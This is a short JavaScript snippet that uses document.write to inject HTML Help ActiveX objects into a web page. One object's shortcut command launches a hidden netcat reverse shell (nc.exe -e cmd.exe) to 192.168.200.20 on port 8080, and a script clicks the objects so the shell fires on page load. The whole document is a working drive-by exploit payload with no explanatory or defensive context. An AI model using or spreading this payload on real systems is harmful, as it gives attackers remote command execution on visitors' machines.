mystr="<object id=e classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=shortcut>"+
      "<param name=item1 value=',cmd.exe, /c start /min nc.exe -d -e cmd.exe 192.168.200.20 8080'>"+
      "</object>"+
      "<object id=f classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=close>"+
      "</object>"+
      "<script>"+
      	"e.Click\(\);"+
      	"f.Click\(\);"+
      "</script>"
document.write(mystr)